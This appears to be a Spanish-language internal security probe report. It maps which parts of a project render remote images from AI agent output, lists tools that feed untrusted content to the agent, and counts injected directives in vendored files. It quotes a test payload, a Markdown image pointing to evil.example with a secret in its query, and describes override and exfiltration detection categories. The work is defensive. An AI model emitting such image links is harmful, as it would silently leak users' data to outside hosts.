# SE-448 S0 — Superficies que renderizan recursos remotos y entradas no confiables

Fecha: 2026-11-18 · Spec: `docs/specs/SE-448-external-content-leak-canary-urls.spec.md` (AC1) · Slice S0, sin cambio de producto.

Premisa comprobada: `scripts/context-sanitize/normalize.py` y `.claude/hooks/prompt-injection-guard.sh` existen en main.

## Conclusión

**S1 aplica en: `projects/savia-web` (chat y visor de ficheros).** El renderizador emite `<img src="https://…">` con la URL del agente tal cual y la política CSP del servidor permite `img-src https:`: una imagen Markdown con datos en la consulta se descarga sola. `projects/savia-sonora` (resumen de reuniones) es probable pero no está ejecutado (ver tabla); se trata como candidato de S1 hasta medirlo.

No aplica en el resto de superficies del repo público (móvil, monitor, plantilla de instalación): ver tabla.

**Pendiente de la operadora:** el repo de Space es privado y no se ha leído aquí. Si Space renderiza Markdown con imágenes remotas, S1 también aplica allí; esta sonda no lo cubre.

## 1. Superficies que renderizan salida del agente

| Superficie | ¿Descarga recurso remoto solo? | Cómo se comprobó |
|---|---|---|
| `projects/savia-web` chat (`src/pages/ChatPage.vue:111`, `v-html` de `renderSafeMarkdown`) | **Sí, imagen.** Iframe no (se escapa como texto). | **Ejecutado**: `renderSafeMarkdown('![x](https://evil.example/?d=SECRETO)')` con `marked` devuelve `<img src="https://evil.example/?d=SECRETO" alt="x" loading="lazy">`; `<iframe src="https://…">` sale como `&lt;iframe…`. **Leído**: `public/serve.json` fija `img-src 'self' data: https:`, que no bloquea la petición. La descarga real en un navegador **no se ejecutó** (sin navegador en el worker): se infiere de `<img src>` + CSP. `loading="lazy"` solo retrasa la petición hasta que la imagen entra en pantalla. |
| `projects/savia-web` visor de ficheros (`src/components/files/FileViewer.vue:202`) | **Sí, imagen** (mismo renderizador). | Leído: mismo `renderSafeMarkdown`; entrada = ficheros del workspace, que pueden venir de terceros. |
| `projects/savia-sonora/app` resumen de reuniones (`src/components/meetings/SummaryView.tsx:135`, `react-markdown` + `remark-gfm`) | **Probable, imagen.** | Leído: sin `components`, `urlTransform` ni `rehype` que filtren imágenes (react-markdown emite `<img>` por defecto); no se encontró CSP en `index.html` ni en `src-pyloid`. **No ejecutado**: no hay `node_modules` en este worktree. El contenido procede de transcripciones, entrada no confiable. |
| `projects/savia-mobile-android` chat y navegador de ficheros (`ChatScreen.kt:705`, `FileBrowserScreen.kt:283`, Markwon 4.6.2) | **No** (imágenes). Los enlaces solo se abren al pulsarlos. | Leído: solo `markwon-core`, `ext-strikethrough`, `ext-tables`; sin plugin de imágenes (`ext-image`, Coil, Glide) en `app/build.gradle.kts` ni en `libs.versions.toml`. No ejecutado (sin Android). |
| `projects/savia-monitor` (Tauri + Vue) | **No.** | Leído: ningún `v-html`, `innerHTML` ni renderizador Markdown en `src/`; solo un logo local. `tauri.conf.json` no define CSP (dato para otra sonda). |
| `scripts/savia-bridge.py` página `/install` | **No.** | Leído: HTML estático generado por plantilla, sin salida del agente. |
| `external/anthropic-skills/skill-creator/eval-viewer/viewer.html` (vendored) | No de imágenes por Markdown; carga fuentes y una librería de CDNs fijos e inserta hojas de cálculo con `innerHTML`. | Leído, no editado (código vendored, solo lectura por política). |
| `projects/savia-vaults`, `projects/soul-continuity` | **No renderizan** (CLI, MCP y API). | Leído: sin renderizador Markdown ni HTML de salida del agente. |
| Space (repo privado) | **No evaluado.** | Fuera de este repo; pendiente de la operadora. |

## 2. Herramientas que introducen contenido no confiable al contexto

| Herramienta | Ruta de código |
|---|---|
| Búsqueda web (`WebSearch`, `WebFetch`, SearxNG con caché) | `.claude/skills/web-research/SKILL.md` |
| Navegador headless Obscura (extracción y scraping) | `.claude/skills/obscura-browser/SKILL.md` (sustituye a `.claude/skills/lightpanda-browser/SKILL.md`, deprecada) |
| Navegador persistente de cuentas (correo, calendario, Teams) | `scripts/browser-daemon.py`, `scripts/browser_helpers.py` |
| Transcripciones de Teams | `.claude/skills/meeting-transcript-extract/SKILL.md`, `scripts/extract-teams-transcripts.py` |
| Transcripciones de audio y reuniones digeridas | `.claude/skills/transcriptor-digest/SKILL.md`, `scripts/transcriptor-scan.sh`, `.claude/agents/meeting-digest.md` |
| Digestores de documentos de cliente (PDF, Word, Excel, PPTX, imágenes) | `.claude/agents/{pdf,word,excel,pptx,visual}-digest.md` |
| Conectores MCP externos y `WebFetch`/`WebSearch` (guard previo de efectos, no de contenido) | `.opencode/hooks/mcp-effect-guard.sh`, `scripts/opencode-plugin/savia-gates/lib/mcp-effect-guard.ts`; política en `docs/rules/domain/mcp-security.md`, `docs/rules/domain/mcp-catalog-policy.md`. `mcp.json` del repo no declara servidores externos (`mcpServers: {}`). |
| Código de terceros vendored | `external/anthropic-skills/` |

## 3. Medición: documentos de terceros con texto imperativo dirigido a agentes

Script versionado: `scripts/se448/third-party-directives.py` (test: `tests/bats/se448-third-party-directives.bats`, fixtures `tests/fixtures/se448-third-party/`). Reproducir: `python3 scripts/se448/third-party-directives.py --root external`.

Método: recorre ficheros de texto, descarta bloques de código vallados y los `LICENSE`/`NOTICE`/`COPYING`, y cuenta líneas que casan con cuatro categorías (anulación de instrucciones, mención de agente + modal imperativo, prohibición o cambio de acción de entrega, orden de enviar a una URL). Los ficheros que son instrucciones de agente por diseño (`SKILL.md`, `agents/*.md`, `CLAUDE.md`, `AGENTS.md`) se cuentan aparte. La salida lleva recuentos y rutas, nunca el texto coincidente.

Resultado en el repo (única raíz de terceros versionada: `external/`, 30 ficheros, 27 escaneados tras excluir licencias y formatos no textuales):

| Grupo | Ficheros | Con texto imperativo |
|---|---|---|
| Documentos de terceros que no son instrucciones de agente | 22 | **1** (`external/anthropic-skills/mcp-builder/reference/evaluation.md`: guía para que un agente escriba evaluaciones) |
| Instrucciones de agente por diseño | 5 | 1 (`external/anthropic-skills/skill-creator/SKILL.md`) |

Lectura honesta:
- Las categorías `override`, `action-ban` y `exfil` dan **0** en `external/`. El único tipo que aparece es la orden normal de un documento de agente a su agente; no hay indicio de inyección.
- La cota es baja a propósito: la heurística exige mencionar a un agente o IA y no cuenta el «you» genérico (en un primer ensayo daba falsos positivos con texto de licencia y avisos a lectores humanos). Se pierde, por ejemplo, un «you MUST» dentro de una cadena de prompt. Es una cota inferior, no una prueba de ausencia.
- `external/` es solo una raíz. El caso que motivó la spec (documentos de proyecto de terceros leídos en investigación) vive fuera del repo; el script acepta `--root` repetible para medir esas carpetas en local, sin publicar los textos.

## 4. Qué cambia para S1-S4

- S1 tiene superficie real en savia-web: no se cierra como no aplicable. Antes de código hace falta confirmar con la operadora cómo se muestra el enlace inerte (escena), según la spec.
- La medición de §3 no justifica por sí sola la categoría `third-party-directive` de S3 con datos del repo público; la justificación queda en la evidencia de la spec (3 documentos externos al repo).
- No se ha medido latencia ni falsos positivos de ningún guard: S0 no cambia producto.
